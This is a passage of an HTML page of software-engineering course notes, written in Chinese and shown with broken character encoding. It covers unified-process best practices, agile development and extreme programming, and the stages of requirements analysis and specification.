title="æœ€ä½³å®è·µ"></a>æœ€ä½³å®è·µ</h4><p>&#x3D;&#x3D;1.è¿­ä»£å¼å¼€å‘&#x3D;&#x3D;</p><ul><li>éœ€æ±‚å˜æ›´ä¸å¯é¿å…</li><li>æ¯æ¬¡è¿­ä»£äº§ç”Ÿä¸€ä¸ªå¯äº¤ä»˜ç‰ˆæœ¬ï¼Œç”¨æˆ·åé¦ˆï¼Œå‡å°‘é£é™©</li><li>æ ¹æ®å®¢æˆ·çš„è½»é‡ç¼“æ€¥æ¥è§„åˆ’å¢é‡ï¼Œå…ˆå¼€å‘å’Œäº¤ä»˜ä¼˜å…ˆçº§æœ€é«˜çš„å¢é‡</li></ul><p>&#x3D;&#x3D;2.ç®¡ç†éœ€æ±‚&#x3D;&#x3D;</p><ul><li>é‡‡ç”¨ç”¨ä¾‹åˆ†ææ¥ä¸ä¼šéœ€æ±‚ï¼Œç”±ç”¨ä¾‹é©±åŠ¨è®¾è®¡å’Œå®ç°</li><li>å¯¹éœ€æ±‚åŠå˜æ›´è¿›è¡Œç®¡ç†</li></ul><p>&#x3D;&#x3D;3.åŸºäºæ„ä»¶ä½“ç³»ç»“æ„&#x3D;&#x3D;</p><ul><li>é‡‡ç”¨åŸºäºæ„ä»¶çš„ä½“ç³»ç»“æ„</li><li>æé«˜è½¯ä»¶å¤ç”¨ç‡</li></ul><p>&#x3D;&#x3D;4.å¯è§†åŒ–å»ºæ¨¡&#x3D;&#x3D;</p><ul><li>ä½¿ç”¨ç»Ÿä¸€å»ºæ¨¡è¯­è¨€(UML)å¯¹ç³»ç»Ÿè¿›è¡Œå¯è§†åŒ–å»ºæ¨¡</li></ul><p>&#x3D;&#x3D;5.éªŒè¯è½¯ä»¶è´¨é‡&#x3D;&#x3D;</p><ul><li>è½¯ä»¶è´¨é‡è¯„ä¼°è´¯ç©¿æ•´ä¸ªå¼€å‘è¿‡ç¨‹çš„æ‰€æœ‰æ´»åŠ¨</li><li>å…¨ä½“æˆå‘˜å‚ä¸</li></ul><p>&#x3D;&#x3D;6.æ§åˆ¶è½¯ä»¶å˜æ›´&#x3D;&#x3D;</p><ul><li>æè¿°å¦‚ä½•æ§åˆ¶å’Œè·Ÿè¸ªè½¯ä»¶çš„å˜æ›´</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104151656086.png" alt="image-20240104151656086" style="zoom:50%;" /><h1 id="æ•æ·å¼€å‘"><a href="#æ•æ·å¼€å‘" class="headerlink" title="æ•æ·å¼€å‘"></a>æ•æ·å¼€å‘</h1><p>æ•æ·è½¯ä»¶å·¥ç¨‹å¸ˆå“²å­¦ç†å¿µå’Œä¸€ç³»åˆ—å¼€å‘æŒ‡å—çš„ç»¼åˆã€‚è¿™ç§å“²å­¦ç†å¿µæ¨å´‡ï¼šè®©å®¢æˆ·æ»¡æ„ä¸”å°½æ—©çš„å¢é‡å‘å¸ƒï¼›å°è€Œé«˜åº¦è‡ªä¸»çš„é¡¹ç›®å›¢é˜Ÿï¼›éæ­£å¼çš„æ–¹æ³•ï¼›æœ€å°åŒ–è½¯ä»¶å·¥ç¨‹å·¥ä½œäº§å“ä»¥åŠæ•´ä½“ç²¾ç®€å¼€å‘ã€‚</p><p>å¼€å‘çš„æŒ‡å¯¼æ–¹é’ˆå¼ºè°ƒè¶…è¶Šåˆ†æå’Œè®¾è®¡(å°½ç®¡å¹¶ä¸æ’æ–¥è¿™ç±»æ´»åŠ¨)çš„å‘å¸ƒï¼Œä»¥åŠå¼€å‘äººå‘˜å’Œå®¢æˆ·ä¹‹é—´ä¸»åŠ¨å’ŒæŒç»­çš„æ²Ÿé€šã€‚</p><h3 id="æ•æ·è½¯ä»¶å¼€å‘å®£è¨€"><a href="#æ•æ·è½¯ä»¶å¼€å‘å®£è¨€" class="headerlink" title="æ•æ·è½¯ä»¶å¼€å‘å®£è¨€"></a>æ•æ·è½¯ä»¶å¼€å‘å®£è¨€</h3><p>&#x3D;&#x3D;ä¸ªä½“äº¤äº’&#x3D;&#x3D;</p><p>ä¸ªä½“å’Œäº¤äº’èƒœè¿‡è¿‡ç¨‹å’Œå·¥å…·</p><p>&#x3D;&#x3D;å¯å·¥ä½œè½¯ä»¶&#x3D;&#x3D;</p><p>å¯ä»¥å·¥ä½œçš„è½¯ä»¶èƒœè¿‡é¢é¢ä¿±åˆ°çš„æ–‡æ¡£</p><p>&#x3D;&#x3D;å®¢æˆ·åˆä½œ&#x3D;&#x3D;</p><p>å®¢æˆ·åˆä½œèƒœè¿‡åˆåŒè°ˆåˆ¤</p><p>&#x3D;&#x3D;å“åº”å˜åŒ–&#x3D;&#x3D;</p><p>å“åº”å˜åŒ–èƒœè¿‡éµå¾ªè®¡åˆ’(å¯¹å˜æ›´çš„è‰¯å¥½å“åº”èƒœè¿‡äº†æŒ‰éƒ¨å°±ç­åœ°éµå¾ªè®¡åˆ’)</p><h3 id="ä»€ä¹ˆæ˜¯æ•æ·"><a href="#ä»€ä¹ˆæ˜¯æ•æ·" class="headerlink" title="ä»€ä¹ˆæ˜¯æ•æ·"></a>ä»€ä¹ˆæ˜¯æ•æ·</h3><p>æ•æ·å·²ç»æˆä¸ºå½“ä»Šæè¿°ç°ä»£è½¯ä»¶è¿‡ç¨‹çš„æ—¶é«¦ç”¨è¯ã€‚æ¯ä¸ªäººéƒ½æ˜¯æ•æ·çš„ã€‚æ•æ·å›¢é˜Ÿæ˜¯èƒ½å¤Ÿé€‚å½“å“åº”å˜æ›´çš„çµæ´»å›¢é˜Ÿã€‚å˜æ›´å°±æ˜¯è½¯ä»¶å¼€å‘æœ¬èº«ï¼Œè½¯ä»¶æ„å»ºæœ‰å˜æ›´ã€å›¢é˜Ÿæˆå‘˜æœ‰å˜æ›´ï¼Œå„ç§å˜æ›´ä¼šå¯¹é¡¹ç›®é€ æˆå½±å“ã€‚æˆ‘ä»¬å¿…é¡»æ¥æ”¶â€æ”¯æŒå˜æ›´â€çš„æ€æƒ³ã€‚</p><p>æ•æ·å›¢é˜Ÿæ„è¯†åˆ°è½¯ä»¶æ˜¯å›¢é˜Ÿä¸­æ‰€æœ‰äººå…±åŒå¼€å‘å®Œæˆçš„ï¼Œè¿™äº›äººçš„ä¸ªäººæŠ€èƒ½å’Œåˆä½œèƒ½åŠ›æ˜¯é¡¹ç›®æˆåŠŸçš„å…³é”®æ‰€åœ¨ã€‚</p><p>æ•æ·ä¸ä»…ä»…æ˜¯&#x3D;&#x3D;æœ‰æ•ˆåœ°å“åº”å˜æ›´&#x3D;&#x3D;ï¼Œå®ƒè¿˜åŒ…å«å¼€å¤´çš„å®£è¨€ä¸­æåŠçš„å“²å­¦è§‚å¿µçš„ä¿¡å¥‰ã€‚é¼“åŠ±èƒ½å¤Ÿä½¿æ²Ÿé€šæ›´ä¾¿åˆ©çš„å›¢é˜Ÿç»“æ„å’Œåä½œæ€åº¦ã€‚å¼ºè°ƒå¯è¿è¡Œè½¯ä»¶çš„å¿«é€Ÿäº¤ä»˜è€Œä¸é‚£ä¹ˆçœ‹ä¸­ä¸­é—´äº§å“ã€‚</p><h3 id="æ•æ·è½¯ä»¶è¿‡ç¨‹"><a href="#æ•æ·è½¯ä»¶è¿‡ç¨‹" class="headerlink" title="æ•æ·è½¯ä»¶è¿‡ç¨‹"></a>æ•æ·è½¯ä»¶è¿‡ç¨‹</h3><p>æ•æ·è½¯ä»¶è¿‡ç¨‹æ˜¯&#x3D;&#x3D;åŸºæœ¬åŸç†&#x3D;&#x3D;å’Œ&#x3D;&#x3D;å¼€å‘å‡†åˆ™&#x3D;&#x3D;çš„ç»“åˆ</p><p>&#x3D;&#x3D;åŸºæœ¬åŸç†å¼ºè°ƒ&#x3D;&#x3D;</p><ul><li>å®¢æˆ·æ»¡æ„åº¦å’Œè¾ƒæ—©çš„è½¯ä»¶å¢é‡äº¤ä»˜</li><li>å°ä½†åˆæ¿€æƒ…çš„å›¢é˜Ÿ</li><li>éæ­£å¼çš„æ–¹æ³•</li><li>æœ€å°çš„è½¯ä»¶å·¥ç¨‹äº§å“</li><li>ç®€åŒ–æ•´ä½“å¼€å‘</li></ul><p>&#x3D;&#x3D;å¼€å‘å‡†åˆ™å¼ºè°ƒ&#x3D;&#x3D;</p><ul><li>åˆ†æå’Œè®¾è®¡çš„äº¤ä»˜</li><li>å¼€å‘è€…å’Œå®¢æˆ·ä¹‹é—´ç§¯ææŒç»­çš„äº¤æµ</li></ul><h3 id="æé™ç¼–ç¨‹"><a href="#æé™ç¼–ç¨‹" class="headerlink" title="æé™ç¼–ç¨‹"></a>æé™ç¼–ç¨‹</h3><p>extreme programming - Xp</p><p>å®ƒæ˜¯æ•æ·è½¯ä»¶å¼€å‘ä¸­ä½¿ç”¨æœ€å¹¿æ³›çš„ä¸€ç§æ–¹æ³•ï¼Œç›®æ ‡æ˜¯åœ¨å¤§å‹ç»„ç»‡å†…éƒ¨ä½¿ç”¨æ•æ·è¿‡ç¨‹ã€‚</p><blockquote><p> æŠŠå¥½çš„å¼€å‘å®è·µè¿ç”¨åˆ°æè‡´</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104014149675.png" alt="image-20240104014149675" style="zoom:50%;" /><h3 id="æ•æ·å¼€å‘ä¼˜ç‚¹"><a href="#æ•æ·å¼€å‘ä¼˜ç‚¹" class="headerlink" title="æ•æ·å¼€å‘ä¼˜ç‚¹"></a>æ•æ·å¼€å‘ä¼˜ç‚¹</h3><ul><li>å¿«é€Ÿå“åº”å˜åŒ–å’Œä¸ç¡®å®šæ€§</li><li>å¯æŒç»­å¼€å‘é€Ÿåº¦</li><li>é€‚åº”å•†ä¸šç«äº‰ç¯å¢ƒä¸‹çš„æœ‰é™èµ„æºå’Œæœ‰é™æ—¶é—´</li></ul><h3 id="æ•æ·å¼€å‘ç¼ºç‚¹"><a href="#æ•æ·å¼€å‘ç¼ºç‚¹" class="headerlink" title="æ•æ·å¼€å‘ç¼ºç‚¹"></a>æ•æ·å¼€å‘ç¼ºç‚¹</h3><ul><li>æµ‹è¯•é©±åŠ¨å¼€å‘å¯èƒ½å¯¼è‡´é€šè¿‡æµ‹è¯•ä½†éç”¨æˆ·æœŸæœ›</li><li>é‡æ„è€Œä¸é™ä½è´¨é‡å›°éš¾</li></ul><h1 id="éœ€æ±‚åˆ†æ"><a href="#éœ€æ±‚åˆ†æ" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h1><h3 id="å®šä¹‰-1"><a href="#å®šä¹‰-1" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>ç¡®å®šç³»ç»Ÿå¿…é¡»å…·æœ‰çš„åŠŸèƒ½å’Œæ€§èƒ½ï¼Œç³»ç»Ÿè¦æ±‚çš„è¿è¡Œç¯å¢ƒï¼Œå¹¶ä¸”é¢„æµ‹ç³»ç»Ÿå‘å±•çš„å‰æ™¯ã€‚</p><p>æ¢å¥è¯è¯´éœ€æ±‚å°±æ˜¯ä»¥ä¸€ç§æ¸…æ™°ã€ç®€æ´ã€ä¸€è‡´ä¸”æ— äºŒä¹‰æ€§çš„æ–¹å¼ï¼Œå¯¹ä¸€ä¸ªå¾…å¼€å‘ç³»ç»Ÿä¸­å„ä¸ªæœ‰æ„ä¹‰æ–¹é¢çš„é™ˆè¿°çš„ä¸€ä¸ªé›†åˆã€‚</p><h3 id="è¿‡ç¨‹-2"><a href="#è¿‡ç¨‹-2" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><ul><li><p>éœ€æ±‚ç¡®è®¤</p><ul><li><p>éœ€æ±‚è·å–</p></li><li><p>éœ€æ±‚æç‚¼</p></li><li><p>éœ€æ±‚æè¿°</p></li><li><p>éœ€æ±‚éªŒè¯</p></li></ul></li><li><p>éœ€æ±‚å˜æ›´</p></li></ul><h2 id="éœ€æ±‚ç¡®è®¤"><a href="#éœ€æ±‚ç¡®è®¤" class="headerlink" title="éœ€æ±‚ç¡®è®¤"></a>éœ€æ±‚ç¡®è®¤</h2><h3 id="éœ€æ±‚è·å–"><a href="#éœ€æ±‚è·å–" class="headerlink" title="éœ€æ±‚è·å–"></a>éœ€æ±‚è·å–</h3><h4 id="å®šä¹‰-2"><a href="#å®šä¹‰-2" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><p>è½¯ä»¶éœ€æ±‚è·å–æŒ‡çš„æ˜¯</p><ul><li>è½¯ä»¶éœ€æ±‚çš„æ¥æº</li><li>è½¯ä»¶å·¥ç¨‹å¸ˆæ”¶é›†è¿™äº›è½¯ä»¶éœ€æ±‚çš„æ–¹æ³•</li></ul><p>å®ƒä¹Ÿè¢«ç§°ä¸ºéœ€æ±‚æŠ“å–ã€éœ€æ±‚å‘ç°å’Œéœ€æ±‚è·å¾—</p><h4 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h4><p>&#x3D;&#x3D;åŠŸèƒ½æ€§éœ€æ±‚&#x3D;&#x3D;</p><p>æè¿°ç³»ç»Ÿåº”è¯¥åšä»€ä¹ˆï¼Œå³ä¸ºç”¨æˆ·å’Œå…¶ä»–ç³»ç»Ÿå®Œæˆçš„åŠŸèƒ½ã€æä¾›çš„æœåŠ¡</p><p>&#x3D;&#x3D;éåŠŸèƒ½éœ€æ±‚&#x3D;&#x3D;</p><p>å¿…é¡»éµå¾ªçš„æ ‡å‡†ï¼Œå¤–éƒ¨ç•Œé¢çš„ç»†èŠ‚ï¼Œå®ç°çš„çº¦æŸæ¡ä»¶ï¼Œè´¨é‡å±æ€§ç­‰ç­‰</p><h3 id="éœ€æ±‚æç‚¼-éœ€æ±‚åˆ†æ"><a href="#éœ€æ±‚æç‚¼-éœ€æ±‚åˆ†æ" class="headerlink" title="éœ€æ±‚æç‚¼(éœ€æ±‚åˆ†æ)"></a>éœ€æ±‚æç‚¼(éœ€æ±‚åˆ†æ)</h3><h4 id="å®šä¹‰-3"><a href="#å®šä¹‰-3" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><p>å¯¹åº”ç”¨é—®é¢˜åŠç¯å¢ƒçš„ç†è§£å’Œåˆ†æï¼Œä¸ºé—®é¢˜æ¶‰åŠçš„ä¿¡æ¯ã€åŠŸèƒ½åŠç³»ç»Ÿè¡Œä¸ºå»ºç«‹æ¨¡å‹ã€‚å°†ç”¨æˆ·éœ€æ±‚ç²¾ç¡®åŒ–ã€å®Œå…¨åŒ–ï¼Œæœ€ç»ˆå½¢æˆä¸‹ä¸€æ­¥çš„éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦ã€‚</p><ul><li>éœ€æ±‚æç‚¼(éœ€æ±‚åˆ†æ)çš„æ ¸å¿ƒåœ¨äº<strong>å»ºç«‹åˆ†ææ¨¡å‹</strong></li><li>éœ€æ±‚æç‚¼(éœ€æ±‚åˆ†æ)é‡‡ç”¨å¤šç§å½¢å¼æè¿°éœ€æ±‚ï¼Œé€šè¿‡å»ºç«‹éœ€æ±‚çš„å¤šç§è§†å›¾ï¼Œæ­ç¤ºå‡ºä¸€äº›æ›´æ·±çš„é—®é¢˜ã€‚</li><li>éœ€æ±‚æç‚¼(éœ€æ±‚åˆ†æ)è¿˜åŒ…æ‹¬ä¸å®¢æˆ·çš„äº¤æµä»¥æ¾„æ¸…æŸäº›æ˜“æ··æ·†çš„é—®é¢˜ï¼Œå¹¶æ˜ç¡®å“ªäº›éœ€æ±‚æ›´ä¸ºé‡è¦ï¼Œå…¶ç›®çš„æ˜¯ç¡®ä¿æ‰€æœ‰é£é™©æ‰¿æ‹…ç€å°½æ—©åœ°å¯¹é¡¹ç›®è¾¾æˆå…±è¯†å¹¶å¯¹å°†æ¥çš„äº§å“æœ‰ä¸ªç›¸åŒè€Œæ¸…æ™°çš„è®¤è¯†ã€‚</li></ul><h4 id="éœ€æ±‚åˆ†ææ¨¡å‹"><a href="#éœ€æ±‚åˆ†ææ¨¡å‹" class="headerlink" title="éœ€æ±‚åˆ†ææ¨¡å‹"></a>éœ€æ±‚åˆ†ææ¨¡å‹</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104152441376.png" alt="image-20240104152441376" style="zoom: 33%;" /><h3 id="éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦-éœ€æ±‚æè¿°"><a href="#éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦-éœ€æ±‚æè¿°" class="headerlink" title="éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦(éœ€æ±‚æè¿°)"></a>éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦(éœ€æ±‚æè¿°)</h3><h4 id="å®šä¹‰-4"><a href="#å®šä¹‰-4" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><p>è½¯ä»¶éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦(SRS)â€”â€”è½¯ä»¶ç³»ç»Ÿçš„éœ€æ±‚è§„æ ¼è¯´æ˜ï¼Œæ˜¯å¯¹å¾…å¼€å‘ç³»ç»Ÿçš„è¡Œä¸ºçš„å®Œæ•´æè¿°ã€‚å®ƒåŒ…å«äº†åŠŸèƒ½æ€§éœ€æ±‚å’ŒéåŠŸèƒ½æ€§éœ€æ±‚ã€‚</p><ul><li>éœ€æ±‚åˆ†æå·¥ä½œå®Œæˆçš„ä¸€ä¸ªåŸºæœ¬æ ‡å¿—æ˜¯å½¢æˆäº†ä¸€ä»½å®Œæ•´çš„ã€è§„èŒƒçš„éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦</li><li>éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦çš„ç¼–åˆ¶æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·å’Œè½¯ä»¶å¼€å‘è€…åŒæ–¹å¯¹è¯¥è½¯ä»¶çš„åˆå§‹è§„å®šæœ‰ä¸€ä¸ªå…±åŒçš„ç†è§£ï¼Œä½¿ä¹‹æˆä¸ºæ•´ä¸ªå¼€å‘å·¥ä½œçš„åŸºç¡€ã€‚</li></ul><h3 id="éœ€æ±‚éªŒè¯"><a href="#éœ€æ±‚éªŒè¯" class="headerlink" title="éœ€æ±‚éªŒè¯"></a>éœ€æ±‚éªŒè¯</h3><h4 id="é‡è¦æ€§"><a href="#é‡è¦æ€§" class="headerlink" title="é‡è¦æ€§"></a>é‡è¦æ€§</h4><p>å¦‚æœåœ¨åç»­çš„å¼€å‘æˆ–å½“ç³»ç»ŸæŠ•å…¥ä½¿ç”¨æ—¶æ‰å‘ç°éœ€æ±‚æ–‡æ¡£ä¸­çš„é”™è¯¯ï¼Œå°±ä¼šå¯¼è‡´æ›´å¤§ä»£ä»·çš„è¿”å·¥ã€‚ç”±éœ€æ±‚é—®é¢˜è€Œå¯¹ç³»ç»Ÿåšå˜æ›´çš„æˆæœ¬æ¯”ä¿®æ”¹è®¾è®¡æˆ–ä»£ç é”™è¯¯çš„æˆæœ¬è¦å¤§å¾—å¤šã€‚å‡è®¾éœ€æ±‚é˜¶æ®µå¼•å…¥1ä¸ªé”™è¯¯çš„éœ€æ±‚ï¼Œè®¾è®¡æ—¶å¯¹è¿™ä¸ªéœ€æ±‚éœ€è¦5-10æ¡è®¾è®¡å®ç°ï¼Œ1æ¡è®¾è®¡éœ€è¦5-10æ¡ç¨‹åºï¼Œ1æ¡ç¨‹åºéœ€è¦3-5ç§æµ‹è¯•ç»„åˆæµ‹è¯•ã€‚</p><h4 id="éœ€æ±‚éªŒè¯çš„å·¥ä½œ"><a href="#éœ€æ±‚éªŒè¯çš„å·¥ä½œ" class="headerlink" title="éœ€æ±‚éªŒè¯çš„å·¥ä½œ"></a>éœ€æ±‚éªŒè¯çš„å·¥ä½œ</h4><p>å¯¹éœ€æ±‚æ–‡æ¡£éœ€æ‰§è¡Œä»¥ä¸‹ç±»å‹çš„æ£€æŸ¥ï¼š</p><ul><li>&#x3D;&#x3D;æœ‰æ•ˆæ€§æ£€æŸ¥&#x3D;&#x3D;ï¼šæ£€æŸ¥ä¸åŒç”¨æˆ·ä½¿ç”¨ä¸åŒåŠŸèƒ½çš„æœ‰æ•ˆæ€§</li><li>&#x3D;&#x3D;ä¸€è‡´æ€§æ£€æŸ¥&#x3D;&#x3D;ï¼šåœ¨æ–‡æ¡£ä¸­ï¼Œéœ€æ±‚ä¹‹é—´ä¸åº”è¯¥å†²çª</li><li>&#x3D;&#x3D;å®Œå¤‡æ€§æ£€æŸ¥&#x3D;&#x3D;ï¼šéœ€æ±‚æ–‡æ¡£åº”è¯¥åŒ…æ‹¬æ‰€æœ‰ç”¨æˆ·æƒ³è¦çš„åŠŸèƒ½å’Œçº¦æŸ</li><li>&#x3D;&#x3D;ç°å®æ€§æ£€æŸ¥&#x3D;&#x3D;ï¼šæ£€æŸ¥ä¿è¯èƒ½åˆ©ç”¨ç°æœ‰æŠ€æœ¯å®ç°éœ€æ±‚</li></ul><h4 id="éœ€æ±‚éªŒè¯æŠ€æœ¯"><a href="#éœ€æ±‚éªŒè¯æŠ€æœ¯" class="headerlink" title="éœ€æ±‚éªŒè¯æŠ€æœ¯"></a>éœ€æ±‚éªŒè¯æŠ€æœ¯</h4><ul><li>éœ€æ±‚è¯„å®¡</li><li>åˆ©ç”¨åŸå‹æ£€éªŒç³»ç»Ÿæ˜¯å¦ç¬¦åˆç”¨æˆ·çš„çœŸæ­£éœ€è¦</li><li>å¯¹æ¯ä¸ªéœ€æ±‚ç¼–å†™æ¦‚å¿µæ€§çš„æµ‹è¯•ç”¨ä¾‹</li><li>ç¼–å†™ç”¨æˆ·æ‰‹å†Œã€‚ç”¨æµ…æ˜¾æ˜“æ‡‚çš„è¯­è¨€æè¿°ç”¨æˆ·å¯è§çš„åŠŸèƒ½</li><li>è‡ªåŠ¨çš„ä¸€è‡´æ€§åˆ†æã€‚å¯ç”¨CASEå·¥å…·æ£€éªŒéœ€æ±‚æ¨¡å‹çš„ä¸€è‡´æ€§</li></ul><h2 id="éœ€æ±‚å˜æ›´"><a href="#éœ€æ±‚å˜æ›´" class="headerlink" title="éœ€æ±‚å˜æ›´"></a>éœ€æ±‚å˜æ›´</h2><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104153638340.png" alt="image-20240104153638340" style="zoom:50%;" /><h2 id="éœ€æ±‚åˆ†æä»»åŠ¡"><a href="#éœ€æ±‚åˆ†æä»»åŠ¡" class="headerlink" title="éœ€æ±‚åˆ†æä»»åŠ¡"></a>éœ€æ±‚åˆ†æä»»åŠ¡</h2><ul><li>&#x3D;&#x3D;å»ºç«‹åˆ†ææ¨¡å‹&#x3D;&#x3D;ï¼šå‡†ç¡®åœ°å®šä¹‰æœªæ¥ç³»ç»Ÿçš„ç›®æ ‡ï¼Œç¡®å®šä¸ºäº†æ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚ç³»ç»Ÿå¿…é¡»åšä»€ä¹ˆ</li><li>&#x3D;&#x3D;ç¼–å†™éœ€æ±‚è¯´æ˜&#x3D;&#x3D;ï¼šç”¨ã€Šéœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦ã€‹è§„èŒƒçš„å½¢å¼å‡†ç¡®åœ°è¡¨è¾¾ç”¨æˆ·çš„éœ€æ±‚</li></ul><h3 id="è½¯ä»¶éœ€æ±‚è§„æ ¼æ–‡æ¡£"><a href="#è½¯ä»¶éœ€æ±‚è§„æ ¼æ–‡æ¡£" class="headerlink" title="è½¯ä»¶éœ€æ±‚è§„æ ¼æ–‡æ¡£"></a>è½¯ä»¶éœ€æ±‚è§„æ ¼æ–‡æ¡£</h3><h4 id="åŸåˆ™"><a href="#åŸåˆ™" class="headerlink" title="åŸåˆ™"></a>åŸåˆ™</h4><ul><li>ä»ç°å®ä¸­åˆ†ç¦»åŠŸèƒ½ï¼Œå³æè¿°è¦â€œåšä»€ä¹ˆâ€è€Œä¸æ˜¯â€œæ€æ ·å®ç°â€</li><li>è¦æ±‚ä½¿ç”¨<strong>é¢å‘å¤„ç†çš„è§„</strong>æ ¼è¯´æ˜è¯­è¨€ï¼ˆæˆ–ç§°ç³»ç»Ÿå®šä¹‰è¯­è¨€ï¼‰</li><li>å¦‚æœè¢«å¼€å‘è½¯ä»¶åªæ˜¯ä¸€ä¸ªå¤§ç³»ç»Ÿä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆæ•´ä¸ªå¤§ç³»ç»Ÿä¹ŸåŒ…æ‹¬åœ¨è§„æ ¼è¯´æ˜çš„æè¿°ä¹‹ä¸­</li><li>è§„æ ¼è¯´æ˜å¿…é¡»åŒ…æ‹¬<strong>ç³»ç»Ÿè¿è¡Œç¯å¢ƒ</strong></li><li>è§„æ ¼è¯´æ˜å¿…é¡»æ˜¯ä¸€ä¸ªè®¤è¯†æ¨¡å‹</li><li>è§„æ ¼è¯´æ˜å¿…é¡»æ˜¯<strong>å¯æ“ä½œçš„</strong></li><li>è§„æ ¼è¯´æ˜å¿…é¡»<strong>å®¹è®¸ä¸å®Œå¤‡æ€§å¹¶å…è®¸æ‰©å……</strong></li><li>è§„æ ¼è¯´æ˜å¿…é¡»<strong>å±€éƒ¨åŒ–å’Œæ¾æ•£è€¦åˆ</strong></li></ul><h4 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h4><ul><li>å¼•è¨€</li><li>ç»¼åˆæè¿°</li><li>éœ€æ±‚æè¿°</li><li>é™„å½•(è¯æ±‡è¡¨ã€åˆ†ææ¨¡å‹ã€ç‰¹å®šé—®é¢˜åˆ—è¡¨)</li><li>ç´¢å¼•</li></ul><h3 id="éœ€æ±‚åˆ†ææ¨¡å‹æ¦‚è¿°"><a href="#éœ€æ±‚åˆ†ææ¨¡å‹æ¦‚è¿°" class="headerlink" title="éœ€æ±‚åˆ†ææ¨¡å‹æ¦‚è¿°"></a>éœ€æ±‚åˆ†ææ¨¡å‹æ¦‚è¿°</h3><p>&#x3D;&#x3D;é¢å‘è¿‡ç¨‹åˆ†ææ¨¡å‹&#x3D;&#x3D;</p><p>åŸºæœ¬æ€æƒ³æ˜¯ç”¨ç³»ç»Ÿå·¥ç¨‹çš„æ€æƒ³å’Œå·¥ç¨‹åŒ–çš„æ–¹æ³•ï¼Œæ ¹æ®ç”¨æˆ·è‡³ä¸Šçš„åŸåˆ™ï¼Œè‡ªå§‹è‡³ç»ˆæŒ‰ç…§â€<strong>ç»“æ„åŒ–ã€æ¨¡å—åŒ–ã€è‡ªé¡¶å‘ä¸‹</strong>â€œåœ°å¯¹ç³»ç»Ÿè¿›è¡Œåˆ†æä¸è®¾è®¡</p><p>&#x3D;&#x3D;é¢å‘å¯¹è±¡åˆ†ææ¨¡å‹&#x3D;&#x3D;</p><p>ç”±<strong>äº”ä¸ªå±‚æ¬¡</strong></p><ul><li>ä¸»é¢˜å±‚</li><li>å¯¹è±¡ç±»å±‚</li><li>ç»“æ„å±‚</li><li>å±æ€§å±‚</li><li>æœåŠ¡å±‚</li></ul><p>å’Œ<strong>äº”ä¸ªæ´»åŠ¨</strong></p><ul><li>æ ‡è¯†å¯¹è±¡ç±»</li><li>æ ‡è¯†ç»“æ„</li><li>å®šä¹‰ä¸»é¢˜</li><li>å®šä¹‰å±æ€§</li><li>å®šä¹‰æœåŠ¡</li></ul><h4 id="åˆ†ææ¨¡å‹æè¿°å·¥å…·"><a href="#åˆ†ææ¨¡å‹æè¿°å·¥å…·" class="headerlink" title="åˆ†ææ¨¡å‹æè¿°å·¥å…·"></a>åˆ†ææ¨¡å‹æè¿°å·¥å…·</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104155857355.png" alt="image-20240104155857355" style="zoom:50%;" /><h2 id="é¢å‘è¿‡ç¨‹çš„åˆ†ææ–¹æ³•"><a href="#é¢å‘è¿‡ç¨‹çš„åˆ†ææ–¹æ³•" class="headerlink" title="é¢å‘è¿‡ç¨‹çš„åˆ†ææ–¹æ³•"></a>é¢å‘è¿‡ç¨‹çš„åˆ†ææ–¹æ³•</h2><h3 id="åˆ†æå»ºæ¨¡å·¥å…·"><a href="#åˆ†æå»ºæ¨¡å·¥å…·" class="headerlink" title="åˆ†æå»ºæ¨¡å·¥å…·"></a>åˆ†æå»ºæ¨¡å·¥å…·</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104160001320.png" alt="image-20240104160001320" style="zoom:50%;" /><h3 id="åˆ†ææ–¹æ³•"><a href="#åˆ†ææ–¹æ³•" class="headerlink" title="åˆ†ææ–¹æ³•"></a>åˆ†ææ–¹æ³•</h3><ul><li>é¢å‘æ•°æ®æµè¿›è¡Œéœ€æ±‚åˆ†æçš„æ–¹æ³•</li><li>ç»“æ„åŒ–åˆ†ææ–¹æ³•é€‚åˆäº<strong>æ•°æ®å¤„ç†ç±»å‹è½¯ä»¶</strong>çš„éœ€æ±‚åˆ†æ</li><li>å…·ä½“æ¥è¯´ï¼Œç»“æ„åŒ–åˆ†ææ–¹æ³•å°±æ˜¯ç”¨<strong>æŠ½è±¡æ¨¡å‹çš„</strong>æ¦‚å¿µï¼ŒæŒ‰ç…§è½¯ä»¶å†…éƒ¨æ•°æ®ä¼ é€’ï¼Œå˜æ¢çš„å…³ç³»ï¼Œ<strong>è‡ªé¡¶å‘ä¸‹</strong>é€å±‚åˆ†è§£ï¼Œç›´åˆ°æ‰¾åˆ°æ»¡è¶³åŠŸèƒ½è¦æ±‚çš„æ‰€æœ‰å¯å®ç°è½¯ä»¶ä¸ºæ­¢</li></ul><h3 id="æ•°æ®æ¨¡å‹-å®ä½“å…³ç³»å›¾"><a 